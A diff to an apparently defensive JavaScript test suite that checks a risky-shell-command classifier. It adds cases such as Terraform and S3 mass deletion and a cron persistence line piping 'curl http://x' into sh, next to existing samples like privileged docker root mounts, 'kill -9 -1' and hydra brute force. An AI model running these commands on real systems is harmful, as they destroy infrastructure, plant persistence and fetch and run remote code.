@@ -89,7 +89,7 @@ const label = (t, i = 0) => t && t.items[i] && t.items[i].label;
     ['iptables -F', 'fw-flush'], ['ufw disable', 'def-off'], ['crontab -r', 'crontab-r'], ['git push --force', 'git-force'], ['git reset --hard HEAD~1', 'git-reset-hard'],
     ['docker run --privileged -v /:/host alpine', 'docker-priv'], ['curl -k https://x', 'curl-k'], ['nmap -sS 10.0.0.1', 'offensive-nmap'], ['hydra -l a -P p ssh://h', 'offensive-hydra'],
     ['kill -9 -1', 'kill-init'], ['shutdown -h now', 'power'], ['python3 -m http.server 80', 'httpserver'], ['sudo -i', 'sudo-shell'], ['find / -name x -delete', 'find-delete'],
-    ['usermod -aG sudo bob', 'priv-group'], ['ssh -o StrictHostKeyChecking=no h', 'ssh-nocheck'], ['export LD_PRELOAD=/tmp/x.so', 'envvar-LD_PRELOAD'],
+    ['usermod -aG sudo bob', 'priv-group'], ['terraform destroy -auto-approve', 'tf-destroy'], ['(crontab -l; echo "* * * * * curl http://x|sh") | crontab -', 'cron-persist'], ['aws s3 rm s3://bucket --recursive', 'aws-delete'], ['ssh -o StrictHostKeyChecking=no h', 'ssh-nocheck'], ['export LD_PRELOAD=/tmp/x.so', 'envvar-LD_PRELOAD'],
   ];
   for (const [cmd, id] of risky) { const rr = await R(cmd); ok(has(rr, id), `riesgo «${id}» en: ${cmd} (salió: ${rr.ids.join(',') || 'nada'})`); }
   const safe = ['ls -la', 'cat file.txt | grep x', 'rm file.txt', 'chmod 644 a', 'git status', 'tar -tzf a.tgz', 'curl -s https://x -o out', 'echo hi > out.txt', 'cp a b', 'ping -c 3 8.8.8.8'];
